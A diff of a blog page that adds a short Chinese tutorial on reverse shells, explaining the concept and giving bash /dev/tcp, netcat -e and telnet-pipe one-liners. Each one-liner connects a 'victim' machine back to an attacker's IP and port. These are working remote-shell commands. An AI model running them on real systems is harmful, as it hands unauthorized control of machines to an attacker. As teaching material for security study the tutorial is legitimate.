@@ -201,7 +201,36 @@
       </header>
     
     <div class="article-entry" itemprop="articleBody">
-    
+
+
+	
+		<h1 id="0X00-什么是反弹shell"><a href="#0X00-什么是反弹shell" class="headerlink" title="0X00 什么是反弹shell"></a>0X00 什么是反弹shell</h1><p>反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<a id="more"></a>
+
+<h1 id="0X01-几种常见的反弹shell"><a href="#0X01-几种常见的反弹shell" class="headerlink" title="0X01 几种常见的反弹shell"></a>0X01 几种常见的反弹shell</h1><p>首先用攻击机监听端口</p>
+<p><img src="https://s1.ax1x.com/2020/07/25/UzFLhd.png" alt="UzFLhd.png"></p>
+<h2 id="1-bash反弹shell"><a href="#1-bash反弹shell" class="headerlink" title="1.bash反弹shell"></a>1.bash反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip地址&#x2F;端口号 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/07/25/UzknBT.png" alt="UzknBT.png"></p>
+<p>攻击机ip地址</p>
+<p><img src="/2020/07/25/%E7%AE%80%E6%98%93%E7%9A%84%E5%8F%8D%E5%BC%B9shell/C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200725105650930.png" alt="image-20200725105650930"></p>
+<p>受害机ip地址</p>
+<p><a href="https://imgchr.com/i/UzkDCd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/25/UzkDCd.png" alt="UzkDCd.png"></a></p>
+<p>受害机输入</p>
+<p><a href="https://imgchr.com/i/UzkfUg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/25/UzkfUg.png" alt="UzkfUg.png"></a></p>
+<p>此时在攻击机上使用ifconfig可以看到是受害机的ip地址，说明拿到了受害机的控制权</p>
+<h2 id="2-nc反弹shell"><a href="#2-nc反弹shell" class="headerlink" title="2.nc反弹shell"></a>2.nc反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh ip地址 端口号</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/07/25/UzAEIe.png" alt="UzAEIe.png"></p>
+<p><a href="https://imgchr.com/i/UzAKMt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/25/UzAKMt.md.png" alt="UzAKMt.md.png"></a></p>
+<h2 id="3-telnet反弹"><a href="#3-telnet反弹" class="headerlink" title="3. telnet反弹"></a>3. telnet反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 攻击主机ip 端口号 | &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgchr.com/i/UzEiSs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/25/UzEiSs.png" alt="UzEiSs.png"></a></p>
+<p><a href="https://imgchr.com/i/UzEAO0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/25/UzEAO0.png" alt="UzEAO0.png"></a></p>
+<p>telnet链接攻击机执行一些命令后，会回显到受害机上</p>
+<h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>shell反弹还有很多通过脚本语言这没有写出，只写了一些简单的反弹shell的方式。</p>
+
+	
 
       
         <h1 id="0X00-什么是反弹shell"><a href="#0X00-什么是反弹shell" class="headerlink" title="0X00 什么是反弹shell"></a>0X00 什么是反弹shell</h1><p>反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
